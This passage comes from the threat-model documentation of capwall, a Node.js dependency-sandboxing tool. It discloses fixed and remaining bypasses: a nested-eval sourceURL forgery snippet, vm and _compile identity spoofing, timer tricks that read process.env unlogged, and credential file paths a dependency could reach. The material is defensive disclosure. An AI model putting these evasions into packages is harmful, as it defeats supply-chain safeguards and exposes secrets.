  disables-it-for-everyone property; it is now gated and logged rather than silent, but not
  closed — see "Loader-hook registration (#61)" above for exactly what remains.
- **Global egress APIs** — `fetch`, `WebSocket` and `EventSource` are globals, not module
  exports, so the loader-interception mechanism never sees them. They are now mediated by a
  separate `globalThis` guard (#80), which closes the plain gap this bullet used to describe. What
  is left is narrower and named under "Global egress surfaces" above: **redirect hops are guarded
  only after the request has gone out**, `init.dispatcher` can supply the dialing code (re-gated
  only where it dials through a mediated module), a pre-install capture holds the raw function,
  and the guarded global is replaceable unless hardened mode is on.
- **fd / symlink escapes** — using an already-open file descriptor, or a symlink, to reach a
  path outside the allowed globs.
- **The module system as a read channel** — `require`/`import` of a path reads a file too, and
  for `.json` it hands the contents back as data. Since #123 that is an `fs.read` decision, but
  only for files **outside every `node_modules` tree**: any file inside the dependency graph is
  loadable by any dependency without a grant, and a module already in `Module._cache` / the ESM
  registry never reaches a loader hook. See § The module system as a read channel for the full
  rule and the rest of its residuals.
- **`vm` / `eval` / `node:sqlite`** and similar reflective or alternate-execution surfaces
  that can sidestep the shimmed API. What these surfaces buy an attacker is reaching APIs
  capwall does not mediate at all, and (with a `vm` grant) choosing the filename its frames
  report. For what `eval`'d code is charged to, see § `eval` and `new Function` below — the
  claim made here after #60, that V8 tells us where such code was compiled, was **wrong**, and
  the correction is #84.
- **Attribution laundering** — capwall attributes each call to the **nearest** package frame
  on the stack (see `core/src/attribution`). A malicious package that arranges for its
  operation to be *executed by* a trusted helper's code (passing a path to a logger that
  writes it, scheduling work a broadly-granted package performs) is charged to the helper.
  Keep helper grants tight; broad grants are laundering targets.

  **What is now closed (issue #60).** This entry used to describe the whole risk, and it was
  wrong: laundering did not require a trusted helper at all. The walk discarded every frame
  with no filesystem path and then fell off the end into `<app>` — so "capwall could not work
  out whose code this is" and "this is the application" were one value, and `<app>` was exempt
  from the `process.env` and `dgram` gates (the only two of today's four that existed then; the
  loader-hook and `_compile` gates inherited the same fail-open when they landed, and inherited
  the fix with it). A dependency reached that state with ~15 lines of
  ordinary ESM: run the payload from a `data:` URL module (no path on any frame) and detach one
  tick through a timer (V8's async stack traces keep the dependency on the stack if it `await`s
  straight through, so the detachment was the essential part). It could then read any
  `process.env` key and send UDP **with no log line at all**, because the `<app>` short-circuit
  returned before `evaluate()`/`onDecision()`. `eval`, `new Function`, and — needing neither
  `data:` nor `eval` — handing a native function to a timer (`setTimeout(Object.assign, 0,
  stash, process.env)`, `setTimeout(sock.send.bind(sock), …)`) all reached the same state. That
  was a fail-open in exactly the Shai-Hulud shape capwall exists to stop, and it is fixed at
  the attribution layer, so all of those vectors close together: an unattributable call is now
  `<unknown>` and is evaluated like any other principal.

  **What remains.** Nearest-package is still nearest-package, so a dependency can still route
  work through a broadly-granted helper (including the app itself) and be charged to it. It can
  still **deliberately deepen or launder its own stack** — push its frame past the frame budget,
  or arrange for another package's frame to be the nearest one — and a `vm` grant lets it name
  any file it likes (`vm.runInThisContext(code, { filename: "…/node_modules/lodash/x.js" })`
  produces frames that attribute to `lodash`). A file under no `node_modules` **and inside the
  project root** is `<app>`, so a dependency that can write a file **and** load it
  (`require("<projectRoot>/tmp/x.js")`) is charged to the app; the fs write is itself gated, but a
  dependency with any write grant plus load is an escalation path. A file under no `node_modules`
  and **outside** the project root is `<unknown>`, not `<app>` — see the linked-dependency bullet
  under § Package identity for why that changed in #127. And granting `<unknown>` broadly in a
  policy restores an exemption for every unattributable call by hand. These are the
  determined-in-process-attacker class, same as un-patching the shims — real, and not papered
  over.
- **`eval` and `new Function` — what they are charged to (issue #84).** An `eval`/`new Function`
  frame has no `getFileName()`. Between #60 and #84 capwall recovered a name for it by parsing
  V8's `getEvalOrigin()`, which for code V8 compiled itself reads `eval at <fn> (<file>:L:C)`.
  A `//# sourceURL=` replaces that string wholesale, so only V8's own form was accepted, on the
  reasoning that the `"eval at "` prefix could not be forged because **a `sourceURL` may not
  contain whitespace**.

  **That reasoning was wrong, and the resulting hole was critical.** The whitespace claim itself
  holds — V8 rejects a `sourceURL` containing a space and reports the genuine origin — but it
  only ever covered a *single* `eval`. For a **nested** `eval`, V8 synthesizes the `eval at <fn>
  (…)` wrapper itself, around the outer script's name, and the outer script's name is exactly
  what its own `sourceURL` set. The attacker never writes the prefix; V8 writes it for them:

  ```js
  const inner = "<payload>";
  const outer = `eval(${JSON.stringify(inner)})\n//# sourceURL=/proj/node_modules/lodash/index.js:1:1`;
  eval(outer); // getEvalOrigin() === "eval at <anonymous> (/proj/node_modules/lodash/index.js:1:1)"
  ```

  No whitespace anywhere, and the `:1:1` the attacker appended completes the shape. A dependency
  with **zero grants** thereby ran with any granted package's capabilities — every capability,
  not just `env` — or with `<app>`'s, whose `process.env` reads are exempted *before* the
  decision is recorded, so that variant needed no granted package in the policy and produced no
  log line at all. The forged path did not have to exist; attribution never touches the disk.

  **No stricter parse recovers it.** V8's depth-1 origin is `eval at <fn> (<script>:L:C)`; its
  depth-N origin is `eval at <fn> (` + the outer script's origin + `)`. When the outer script
  carries a `sourceURL`, its origin *is* that bare `sourceURL`, so a forged depth-2 origin is
  character-for-character the shape of a genuine depth-1 one. Counting `eval at ` tokens, taking
  the outermost match, or requiring a trailing `:L:C` all fail on the same input. V8 exposes the
  origin only as a formatted string — there is no structured accessor — so there is nothing else
  to consult.

  **What capwall does now.** `getEvalOrigin()` is not read. An eval frame is treated like every
  other frame with no filesystem identity: opaque, skipped, and the walk continues to the nearest
  frame that has a real file name. Concretely:

  - A dependency that compiles and **synchronously runs** its own code — a template engine,
    `ajv`, anything using `new Function` for speed — still has its own frame directly beneath,
    so it is still charged **by name** and keeps exactly its own grants. This is the common
    legitimate case and it is unchanged.
  - **Detached** eval'd code (`eval("setTimeout(payload)")`) leaves no real frame behind and is
    `<unknown>`. #60's fail-closed half survives — it is gated and recorded, never `<app>` — but
    #60's by-name precision for this case does not, because it rested on a forgeable string.
  - The **application's own** `eval` is `<unknown>`, not `<app>`. The trust root carries
    exemptions, so it may not be inferred through code with no identity; otherwise a dependency
    that persuades the app to `eval` a string it supplied inherits the app's authority.

  Grant `"<unknown>"` explicitly if a real tree needs the last two — narrowly, and knowing that
  grant is shared with every other unattributable caller.

  **What remains.** Eval'd code is now laundered exactly as a `data:` module already could be:
  if a **granted** package invokes an attacker-supplied closure that has no file identity, the
  granted package's frame is the nearest one and is charged. That is the nearest-package residual
  in the bullet above, reachable on any released capwall via `data:` and not new here — but the
  fix does bring `eval` into the same residual, where before the (forgeable) origin string
  happened to name the compiling package instead.
- **Package identity is a path, not a verified fact.** A principal's name comes from a frame's
  file path. Two forgeries fell out of that (#92, #93); both are closed, and what is closed is
  narrower than "identity is now verified", so the residual is spelled out below rather than
  removed.

  **What was wrong.** `packageForPath` read the name from the *last* `node_modules/<name>`
  segment and never touched the disk, so any code running from such a path *was* that package:

  - A dependency that ships a directory named after a granted package inside its own tree
    (`node_modules/evil/node_modules/lodash/…`, e.g. via `bundledDependencies`, or any
    git/tarball dependency) and runs code from it was charged to that name. No `eval`, no `vm`,
    no `fs` write — ordinary frames, a real file. **Issue #92.**
  - `new (require("node:module"))(…)._compile(src, "…/node_modules/lodash/x.js")` compiles code
    with a caller-chosen filename, and V8 reports it as `getFileName()` on every resulting
    frame. `isEval()` is false and the path need not exist. The `node:module` shim gated hook
    registration, not compilation. **Issue #93.**

  Both let a dependency holding **no grant at all** run with a granted package's capabilities —
  or with `<app>`'s, whose `env` reads are exempted before the decision is recorded, so that
  variant produced no log line for `observe` or `capwall diff` either.

  **What capwall does now — #93.** A direct call to `Module.prototype._compile` with a filename
  that is not the caller's own is a gated capability, `compile`. The gate is a patch on
  `Module.prototype` rather than on the `node:module` shim, because `_compile` is read off the
  prototype (the shim's `get` trap never sees it) and because
  `process.getBuiltinModule("node:module")` returns the un-shimmed module on Node ≥22 — a
  prototype patch survives that, a shim gate does not. Node's own loader calls are recognized by
  their caller frame and never gated; a package compiling under its **own** name (a template
  engine, `require-from-string`) is not gated either, because it acquires no identity it lacks.

  `compile` is **identity-granting**: a package holding it can execute as any principal in the
  policy, including `<app>`. It exists because refusing outright would break the dominant
  legitimate use of `_compile` — the `require.extensions` transform hook, which is how `ts-node`,
  `tsx`, `@babel/register`, `@swc/register`, `pirates` (and thus `nyc`/`istanbul`) and
  `require-in-the-middle` (and thus `dd-trace`, `elastic-apm-node`) all work, each compiling
  another package's or the application's file by design. Grant it to the one build or
  instrumentation tool that needs it and to nothing else. A `vm` grant has always carried the
  same power (`vm.Script`, `vm.compileFunction` and `vm.runInNewContext` all take a `filename`);
  it is now named as such here and in the schema rather than only in the `vm` bullet.

  **What capwall does now — #92.** A principal is the whole **install chain** from the project
  root, not the last segment: `lodash` for a top-level install, `evil>lodash` for a copy
  installed under `evil`. A vendored directory is therefore a principal of its own and holds
  whatever the policy grants *it*, which by default is nothing. A package-manager virtual store
  (`node_modules/.pnpm/…`, yarn's `.store`) is looked through, but only at the first link — a
  `.pnpm` directory shipped deeper is inside somebody's tarball and stays in the chain, or the
  skip would be the same forgery one rename away.

  This **stops the conflation; it does not verify provenance.** capwall cannot tell an
  attacker-vendored `node_modules/evil/node_modules/lodash/` from the copy npm or yarn genuinely
  installs to resolve a version conflict, because *nothing on disk distinguishes them* — not the
  nested `package.json` (the attacker writes it), not the parent's `dependencies` (likewise), not
  the layout (byte-identical). Only a lockfile records provenance, and capwall cannot assume one
  is present, current, or parseable without adding a dependency. So it declines to guess and
  keeps the two positions apart instead.

  **The compatibility cost, stated.** A legitimately nested install is a new principal name, so a
  hand-written `"lodash": {…}` no longer covers `webpack>lodash`. `observe` and
  `capwall gen-policy` emit chain names automatically and `capwall diff` reports the difference,
  so the upgrade path is to re-observe. Two wildcard forms widen a leaf name, and they are not the
  same: `"*>lodash"` grants an install nested **exactly one level** (`webpack>lodash`, not
  `webpack>babel>lodash`), while `"**>lodash"` grants it at **any depth**. Neither covers the
  top-level `lodash`, so "everywhere" is still two keys — the exact one plus a wildcard. (The
  grammar lives in `packages/policy-schema/src/package-key.ts`; a narrow `*>` key beats a broad
  `**>` key, the same way an explicit entry beats `default`.) That widening is
  deliberately explicit, because writing it means *any* package in the tree may ship a directory
  called `lodash` and receive those grants — which for an `fs.read` glob is usually fine and for
  `child_process` is a bypass with extra steps. Trees installed with yarn 1, which nests far more
  aggressively than npm 3+, will see the most churn.

  **Linked and workspace dependencies — the consequence of "identity is position" that arrives
  for free (#127).** Node resolves module paths through `realpath`, so a dependency installed as a
  **symlink** into `node_modules` reports a file path with no `node_modules` segment in it. Until
  #127 that made it `<app>`, the trust root — which needed no attacker action and no grant,
  because it is the default on-disk shape of `npm i file:../x`, of `npm link`, and of every
  workspace tool. Every first-party package in a monorepo was the application, could not be given
  a policy at all, and picked up `<app>`'s exemptions from the `process.env`, `dgram` and
  loader-hook gates *before* the decision was recorded, plus the identity-granting `_compile`
  exemption. The `<app>` bullet above described the rule; it drew the consequence only for a
  dependency that could write a file and then load it, and this is the same consequence with no
  write and no attacker.

  **What capwall does now.** The identity of a linked package is **the link source** — the
  `node_modules/<name>` entry that pointed at it — run through the ordinary install-chain
  derivation. `proj/node_modules/linked -> ../vendor/linked` makes every file under
  `vendor/linked` answer to the principal `linked`: a name a policy author can write, a name
  `observe` / `gen-policy` emit, and a principal distinct from `<app>`. A workspace member is
  therefore neither the application nor an unnameable blob; it is `@scope/lib`, exactly as if it
  had been installed from a registry. Rewriting is iterative, so it composes with the chain —
  `@w/util` reached through `@w/lib` is `@w/lib>@w/util`, not the top-level `@w/util`.

  The link is recorded when Node resolves through it (a `Module._findPath` observer, which is
  passive and gates nothing), because there is no directory capwall could scan instead: **npm
  hoists the workspace link to the repo root, pnpm puts it in the importing package's own
  `node_modules`.** A resolution capwall did not observe is recovered afterwards by looking for a
  `node_modules/<name>` entry that *verifiably* resolves to the package directory; the `name` in
  a `package.json` is used only as a lookup key, never believed, so a package claiming
  `"name": "lodash"` gains nothing unless a `node_modules/lodash` really does point at it — in
  which case that is what `require("lodash")` resolves to in that tree.

  **What this does not reach, stated plainly.**
  - **ESM imports are recovered, not observed.** `module.register()` hooks run on Node's separate
    loader thread, so capwall's ESM `resolve` hook cannot write the map. Recovery covers a link
    sitting in a `node_modules` directory above the package itself or above the project root,
    which is every layout measured (`npm i file:`, `npm link`, npm/yarn workspaces, and pnpm
    workspaces when the project root is the consuming package — what `npm run -w` and
    `pnpm --filter` both produce). The gap is an **ESM-only** import of a workspace package whose
    realpath is **inside** the declared project root, when nothing ever resolved it through CJS:
    that one is still `<app>`. Pointing `CAPWALL_PROJECT_ROOT` at the consuming package closes it.
  - **The entry-point package stays `<app>`.** Code reached by path rather than through a
    `node_modules` entry is the application, which is what makes `<app>` a *positive*
    identification (#60) rather than a fallback.
  - **A file outside the project root, under no `node_modules`, with no link found, is now
    `<unknown>`** — deny-by-default, recorded, grantable — rather than `<app>`. Being outside the
    project is not evidence of being the project; `loader/native.ts` has made the same move for
    `.node` files since #49. The cost is that an application whose own sources live outside its
    declared project root is denied by default. That is loud (a `DENY '<unknown>'` line naming the
    capability), and the fix is to point `CAPWALL_PROJECT_ROOT` at the tree that is actually the
    application.

  **What remains forgeable.**
  - **Identity is still position, not publisher.** `node_modules/lodash` is whatever is on disk
    at that path. A typosquat, a compromised publish, or a hand-edited working copy all answer to
    `lodash`. capwall verifies nothing about the artifact; that is a job for a lockfile-integrity
    or provenance-attestation check at install time, and capwall does not do one.
  - **Anything that can create a symlink can choose a name**, exactly as anything that can write
    into `node_modules` can. A dependency with an `fs` write grant that covers a `node_modules`
    directory can link a granted name at its own tree. This is the bullet below, not a new hole:
    the link is a `node_modules` entry like any other.
  - **Anything that can write into the tree can choose its name.** An `fs` write grant covering
    `node_modules`, a postinstall script, or any lifecycle hook can install code at a granted
    package's path. Grants that let a dependency write into `node_modules` should be read as
    grants of every other package's identity.
  - **A `compile` or `vm` grant is a grant of every other grant**, as above.
  - **`process.binding("contextify")` and other raw-internal compile routes** remain the
    pre-existing, path-independent residual named below. A prototype patch survives
    `getBuiltinModule`; it does not survive reaching past the module system entirely.
  - **`Module.prototype._compile` is writable**, so in-process code can overwrite it and remove
    the gate. Doing so also breaks `require` for the whole process, so it is loud rather than
    silent; it is the same class of escape as un-patching any shim, which capwall does not claim
    to stop. Hardened mode deliberately does not freeze this prototype — `require.extensions`
    tooling replaces methods on it.
  - **Nearest-package laundering is unchanged.** A granted package that invokes an
    attacker-supplied callback still lends its frame, and therefore its name, to that callback.
    See the nearest-package bullet above.
- **Deep stacks past the attribution frame budget** — the walk inspects at most `maxFrames`
  frames (default 25). When the owning dependency's frame is deeper (long promise chains,
  dynamically-compiled or deeply-nested wrappers, `async_hooks`-heavy frameworks), the walk
  runs out of budget without finding it. That used to fall back to `<app>`, the trust root,
  which could **wrongly allow** the call; since #60 it falls back to `<unknown>`, so it is
  denied by default in enforce instead — a capped attribution now fails closed, including on
  the `process.env` and `dgram` paths that exempt `<app>`. The trade is the other direction:
  a benign deep stack is **wrongly denied** rather than wrongly allowed. Mitigation: the budget
  is configurable — `CAPWALL_MAX_FRAMES` for the preload/CLI, `install(…, { attribution: {
  maxFrames } })` in-process — and an exhausted walk is **flagged, not silent** (the decision
  carries `attributionTruncated: true`; the preload warns once on stderr), so the fix is to
  raise the budget rather than to grant `<unknown>`. This is still a **mitigation, not a fix**:
  a dependency can deliberately deepen its own stack past whatever budget is configured, which
  now costs it its grants rather than gaining it the app's. Raising the budget costs throughput
  on every mediated call (issue #15).
- **Native `.node` addons** — arbitrary compiled code. Since S2 (#49) capwall **gates the
  load**; it does not confine the addon. Full treatment in § Native `.node` addons below.
- **Subprocess internals** — capwall can gate *whether* a `child_process` spawn happens, but
  once a child process runs it is outside capwall's process and outside its confinement.

**Gating vs confinement.** For native addons and subprocesses, capwall provides **gating**
(a policy decision about whether they are allowed to start) but **not confinement** (control
over what they do after starting). Do not treat a gated-but-allowed addon or subprocess as
confined.

## Hardened mode (opt-in, off by default) — issue #17

`install(policy, mode, { hardened: true })`, or `CAPWALL_HARDENED=1` for the CLI preload,
freezes the capability surfaces capwall hands to dependencies. It exists because the default
shim is a plain mutable object, so `fs.readFileSync = evil` is a one-line, un-logged removal
of enforcement **for the whole process** (the un-patching bullet above). Hardened mode is
**off by default and must stay off by default** — see the graceful-fs cost below.

**What it freezes** (only objects capwall itself created — never a builtin):

- Every shim **namespace** handed to a dependency: `fs`, `fs.promises`, `net`, `http`,
  `https`, `tls`, `http2`, `dgram`, `child_process`, `worker_threads`, `vm`. So
  `fs.readFileSync = evil`, `delete fs.readFileSync`, and
  `Object.defineProperty(fs, "readFileSync", …)` all fail.
- Every guarded **wrapper function** on those namespaces, including wrappers hanging off
  other wrappers (`fs.realpath.native`).
- Every guarded **class in every shim — and its prototype**. That is the complete set from
  "Capability-bearing classes" above: the prototype-method sites (`net.Socket`,
  `tls.TLSSocket`, `http(s).Agent`, `dgram.Socket`, `child_process.ChildProcess`) and the
  constructor sites (`fs.ReadStream`/`WriteStream` + their `File*Stream` aliases,
  `vm.Script`/`SourceTextModule`/`SyntheticModule`, `worker_threads.Worker`,
  `http(s).ClientRequest`). The prototype freeze is what matters for the method sites:
  `net.Socket.prototype.connect = evil` is otherwise the same one-line un-guard, one level
  down. Freezing a guarded class does **not** stop `class Mine extends fs.ReadStream {}` —
  that reads the frozen class and writes to a new one.
- The guarded `send`/`connect` properties capwall installs for a `dgram` socket — on the
  instance for a `createSocket()` result, on the guarded subclass's prototype for
  `new dgram.Socket()`. The socket itself is never frozen (it needs its mutable state), so these
  are pinned individually: installed as **accessors with no setter and `configurable: false`**,
  which gives `socket.send = evil` the same outcome `writable: false` did (a `TypeError` under
  `"use strict"`, a silent no-op in sloppy mode) and makes
  `Object.defineProperty(socket, "send", …)` and `delete socket.send` fail. An accessor rather
  than a pinned data property because the guard has to be able to choose what Node's own
  internal `this.send` read yields, for one authorized call, WITHOUT redefining the property —
  issue #86 was the collision between that need and the pin, and it made every allowed
  `dgram.createSocket().send()` throw `Cannot redefine property: send` under hardened mode. An
  accessor is computed per read, so there is nothing left to compete over.
- The guarded `createConnection` on the `http(s).globalAgent` **view** (#65/#88): under hardened
  mode a write to it is refused outright instead of being kept in the per-view shadow, so
  `http.globalAgent.createConnection = evil` gets the same `TypeError`-under-strict-mode outcome
  as a frozen property. The view itself is **not** frozen and never can be — freezing it is
  `preventExtensions`, which it refuses, and freezing the agent behind it breaks the process's
  HTTP client. Live pool state stays writable under hardened mode for the same reason: Node's own
  agent bookkeeping writes it through `this`.
- The **guarded global egress surfaces** (#80): `globalThis.fetch`/`WebSocket`/`EventSource` are
  installed **non-writable**, so `globalThis.fetch = evil` fails, and the guarded wrapper /
  subclass is frozen. They stay **`configurable`** on purpose — a non-configurable global could
  never be restored by `uninstall()`, which would leave a permanent process-wide mutation. So
  `Object.defineProperty(globalThis, "fetch", …)` still un-gates them; that is the deliberate
  price of a restorable global, and it is the same class of escape as climbing past a guarded
  prototype.

**It applies to `import` as well as `require`,** and that is now asserted rather than assumed.
The #86 sibling audit found it had NOT: the ESM path built its shims from a context onto which
`hardened` was never mirrored, so `CAPWALL_HARDENED=1` froze nothing at all on the path
`capwall run` enables by **default**. The namespace half is moot under ESM (a module-namespace
object rejects assignment on its own), but `net.Socket.prototype.connect = evil` and
`dgram.Socket.prototype.send = evil` landed — silently, under the mode enabled to stop exactly
that. #87's live-context rework closed it in passing, which is luck, not coverage: nothing in the
suite crossed hardened mode with the ESM path, so it could have regressed as quietly as it
arrived. `test/hardened.test.ts` now pins both states of the `CAPWALL_HARDENED` override on the
ESM path, and `test/install-option-parity.test.ts` (#90/#97) asserts every install option —
`hardened` among them — on **both** paths from one process, so a regression on either is a test
failure rather than a silence.

**`hardened: true` now FAILS LOUDLY when capwall cannot apply it (#97).** A security option that
is accepted and silently not applied is worse than one that is refused, so `install()` verifies
the post-condition after wiring everything up: the shim namespaces it just built must be frozen
(on the CJS registry always, and on the ESM registry when `esm: true`), and the egress globals it
just replaced must be non-writable. If any is not, the partial install is **rolled back** and
`install()` throws, naming the surfaces. The check observes rather than predicts — it inspects
only objects capwall itself created, on only the paths that call is mediating — so it cannot
produce a spurious startup throw for an option capwall *did* honor. What it does catch is the
#97 class: a plumbing change that stops `hardened` reaching one of the two paths. The one
realistic non-plumbing way to trip it is narrower than it first looks: un-mediated code has to
make an egress global **non-configurable in the window between capwall replacing it and the
hardened install arriving**. A pin that lands before *any* install is not a trip at all — a
non-configurable location is declined outright by `GlobalPropertySlot.replace` ("a location
capwall could not restore later is never replaced in the first place"), so it never enters the
replaced set and the check never looks at it. Whichever way it arrives, capwall refuses rather
than running with the option quietly absent.

**`hardened` is a RATCHET for the process, not a per-install setting (#129).** Installs nest, and
this is the one option that does **not** follow the newest one the way `policy` and `mode` do.
Once any install has asked for hardening, every freshly handed-out shim is frozen and the egress
globals stay pinned **until the last install is released**; `hardened: false` means "I am not
asking for it", never "turn it off". So a later `install({ hardened: false })` cannot downgrade a
hardened install that is still active, and passing `hardened: false` guarantees nothing about the
surfaces you get if something else in the process asked for hardening.

Before #129 only *half* the option behaved this way. The egress globals ratcheted
(`GlobalPropertySlot.pin` is re-applied on every install and nothing un-pins until the last one
restores), while the shim registries were last-writer-wins: with a `hardened: true` install still
active, a later `install({ hardened: false })` made every subsequent `require("node:fs")` return
an **unfrozen** shim, which a dependency can then monkey-patch — process-wide, unlogged, the exact
one-liner hardened mode exists to close. The `hardened: true` install had verified its
post-condition (above) and returned a handle; nothing revoked or re-checked that promise, and
nothing warned. One `install()` therefore left the process half-hardened, and which half you saw
depended on which surface you looked at, so neither behaviour was documented as intended. The
ratchet is the safer of the two and the one already in force on the egress side, so it is now the
rule on both. It is not a dependency-reachable bypass — reaching it means calling `install()`,
which is the "reach capwall's own machinery" class this document already declines to defend — but
it is a real hazard for embedders, who are told installs nest and teardown is order-independent.

One further consequence is worth stating plainly, because `Object.freeze` is irreversible and
everything else about an install IS live: a shim reference a module already captured keeps the
hardening of the install that first built it. A later hardened install gets frozen shims for
anything freshly handed out — the registry is memoized per hardened-ness — but it cannot
retroactively freeze what is already held. Install capwall early; that is what the `--import`
preload is for.

Note the dependency on issue #64: while `fs.ReadStream`, `vm.Script` and
`worker_threads.Worker` were construct-trap Proxies, hardened mode could not freeze them at
all — `Object.freeze` on a Proxy forwards `[[PreventExtensions]]`/`[[DefineOwnProperty]]` to
its **target**, so freezing one would have frozen the real builtin class process-wide,
outliving `uninstall()`. Converting them to guarded subclasses made them capwall-owned
objects, and therefore freezable. Hardened mode now covers every guarded class, not a subset.

**Observable behavior of a blocked patch.** Freezing does not raise an alarm. A write to a
frozen object **throws a `TypeError` only under `"use strict"`**; in sloppy-mode CJS — which
is what most published packages still are — it **silently no-ops**. There is no capwall log
line for a blocked patch attempt. The guarantee is only that the original guarded method is
still installed and still enforcing afterwards.

**What it does NOT protect against.** Hardened mode raises the cost of un-patching. It is not
a sandbox and it closes none of the following, each re-verified against a hardened install
with a deny-all `enforce` policy:

- **Replacing `Error.captureStackTrace`** — the one line under § What capwall does NOT stop →
  *Shared mutable primordials*, re-verified against a hardened install: the `compile` gate still
  waves the forged call through with no decision recorded, and the attribution walk still returns
  the principal the fake CallSite names. `Error` is a primordial, not a capwall-created object,
  so there is nothing here for hardened mode to freeze — and freezing it is not available anyway
  (it breaks every stack-formatting library and outlives `uninstall()`). This is listed first
  because it is **cheaper than everything else in this list and defeats every gate at once**,
  including the ones hardened mode does close: it does not need to touch a shim.
- **`process.getBuiltinModule("node:fs")`** (Node ≥22) — a plain public API returning the
  real, un-shimmed module; the read succeeds. Also `process.binding`, internal module caches,
  and builtins loaded from a context capwall has not patched. These never touch a shim object,
  so freezing shim objects is irrelevant to them. **This alone makes hardened mode
  defense-in-depth, not a boundary.**
- **The real `http.globalAgent` / `https.globalAgent` behind the guarded view.** The view
  capwall hands out is guarded (#65) and, under hardened mode, its `createConnection` cannot be
  replaced at all (#88). The **real** agent underneath is never frozen — freezing it is the
  process-wide breakage #88 is about — so code that reaches it another way (see
  `process.getBuiltinModule` above) reaches an unguarded `createConnection`. Freezing could not
  fix that anyway: the missing guard would be the problem, not a writable property.
- **Replacing `process.env` wholesale** — the env read allowlist is a `Proxy` over the live
  `process.env`, not a capwall-created namespace. Freezing it would break `process.env.X = y`
  for the whole process and freeze the real environment object, so it is left alone;
  `process.env = {…}` still un-gates env reads.
- **Shadowing a guarded PROTOTYPE method with an own property on an instance.** The `dgram`
  pin above is complete for a `createSocket()` result, where the guard is an own property of the
  socket, but only half-complete for `new dgram.Socket()`, where it lives on the guarded
  subclass's frozen prototype: assignment (`socket.send = evil`) fails, because assignment
  consults the inherited setter-less accessor, but `Object.defineProperty(socket, "send", …)`
  succeeds — `[[DefineOwnProperty]]` does not consult the prototype chain, and the socket cannot
  be frozen. Closing it would mean freezing every socket, which a socket does not survive. This
  is asserted, not assumed: `test/dgram.test.ts` pins both halves so the asymmetry stays a
  recorded decision.
- **Climbing PAST a guarded class**, exactly as documented under "Capability-bearing classes":
  `Object.getPrototypeOf(net.Socket.prototype).connect` still reaches the real method, and
  `new (Object.getPrototypeOf(fs.ReadStream.prototype).constructor)(deniedPath)` still reaches
  the real class. Freezing capwall's subclass says nothing about the real class above it.
- **Prototype pollution / primordials / fd + symlink escapes / `eval` / native addons /
  subprocess internals / attribution laundering / deep stacks** — all unchanged. Hardening
  primordials is SES's job.

What hardened mode **did** close, verified the same way: `fs.readFileSync = evil`,
`delete fs.readFileSync`, `Object.defineProperty(fs, …)`, `fs.promises.readFile = evil`,
`net.Socket.prototype.connect = evil`, and replacing a guarded class on its namespace
(`fs.ReadStream = evil`, `vm.Script = evil`, `worker_threads.Worker = evil`) — each is a
silent no-op or a `TypeError`, with the original guard still denying afterwards.

**Cost: it breaks `graceful-fs`, and therefore anything that depends on it.** `graceful-fs` is
a transitive dependency of npm, webpack, and a large fraction of the ecosystem, and it patches
`fs`'s methods at load time. Against a frozen `fs` that patch throws a `TypeError` (its
sources are strict-mode), so the dependent package fails to load. The same applies to every
other legitimate `fs` monkey-patcher. Enabling hardened mode is a deliberate trade: you lose
`graceful-fs`-class compatibility — the no-SES-tax property that is capwall's whole adoption
argument — and gain the closure of the reassignment escape only. Try it in `observe` mode
first; a load-time `TypeError` from a patcher is what failure looks like.

## The module system as a read channel (`require` / `import`) — #123

**What this is.** `fs` is not the only route to a file's bytes. `require("/abs/x.json")` reads
through `Module._extensions['.json']` and hands the parsed contents back as a value;
`import("/abs/x.json", { with: { type: "json" } })` does the same through Node's JSON translator.
Until #123 neither took a capability decision: capwall's `Module._load` patch only routed
*mediated builtin specifiers* to shims, so a **path** specifier fell straight through, and the ESM
side never reached the `fs` shim at all. Under a deny-all `enforce` policy with zero grants — no
`eval`, no `vm`, no `compile`, no write — a dependency read any file on disk with **no decision
recorded at all**: nothing denied, nothing in the `observe` trace, nothing for `capwall diff`.
That last part was the compounding cost — `observe` cannot record what it never sees, so a
generated policy under-reported the package's real filesystem reach.

**The gate, in one sentence.** *A module load is free when the resolved file belongs to an
installed package (any `node_modules` tree) or when the loader is the application; otherwise it is
an `fs.read` decision on the resolved path.* It applies to **both** module systems and to every
format Node's loaders can return (`.json`, `.js`/`.cjs`/`.mjs`, `.wasm`), with one carve-out
below.

**Why the line is drawn there.** Loading a dependency's own files is the most common thing any
program does. Gating every `require` as `fs.read` would make every policy grant every package its
own directory — unusable, and it would train operators to write wide `fs.read` globs, which is a
net loss. Every file a package owns, and every file any other installed package owns, is by
construction inside somebody's `node_modules` tree — or is reached through a symlink in one, which
#127's link map recovers — so "does this file belong to an installed package?" is an exact test for
"this is the dependency graph" that needs no policy grant. It is asked BOTH ways, and each covers
a real case the other misses: the literal path position (which does not depend on how
`projectRoot` was declared, so a root pointed at the tree's own `node_modules` does not turn an
ordinary `require("some-dep")` into a denial), and `packageForPath` (which undoes Node's `realpath`
for the symlinked installs every `npm link` / `npm i file:` / workspace layout produces). What is
left after that exemption is precisely the interesting case: a **dependency** naming a file that
belongs to no
package — `~/.docker/config.json`, `~/.aws/sso/cache/*.json`,
`~/.config/gcloud/application_default_credentials.json`, `<project>/package-lock.json`, an
app-local `secrets.json`, `/tmp/x`. The application itself is exempt because it is the trust root,
the same rule the `compile`, loader-hook and `process.env` gates use; since #60 that is a
*positive* identification, so a load capwall cannot attribute is `<unknown>` and is gated.

**Why `fs.read` and not a new capability.** `native` (#49) and `compile` (#93) are boolean grants
because their subject cannot be narrowed to a file list. A module read has no such problem: it
names a real file, the policy already has a glob vocabulary for exactly that, and "may this
package `require` `<project>/config.json`" and "may it `readFileSync` it" are the same question.
`observe` emits the grant automatically, so the observe→enforce round trip needs no hand editing.

**Subjects, and why they differ by module system.** On the CJS path the subject is the
**attributed caller** (capwall's ordinary stack walk), deliberately not the `parent` module the
loader supplies: `createRequire()` builds a module record whose filename is whatever string it was
given, so trusting `parent.filename` would let any dependency present itself as a granted package.
On the ESM path there is no JavaScript stack to walk — the hook runs on Node's loader thread — so
the subject is `context.parentURL`, which the host sets from the module record containing the
`import` and which in-process code cannot choose. An importer with no filesystem identity (a
`data:` URL module) is charged to `<unknown>`, never inferred to be the trust root.

**How the ESM half reaches a policy at all.** The loader hooks run on a separate thread, and the
main thread *blocks* on their results during synchronous module loads, so a round trip back to the
main thread would deadlock. The hook therefore holds a **copy** of the policy, refreshed
synchronously from a `MessagePort` (`receiveMessageOnPort`, no event-loop turn) at the top of every
invocation; `install()` posts the new snapshot before it returns, so there is no window in which an
import is evaluated against a policy the main thread has already replaced. The copy is evaluated by
the *same* `evaluate()` / `packageForPath()` / `matchesGlob()` functions the main thread uses — one
decision procedure, not two. Decisions travel back over the same port and land in `onDecision`;
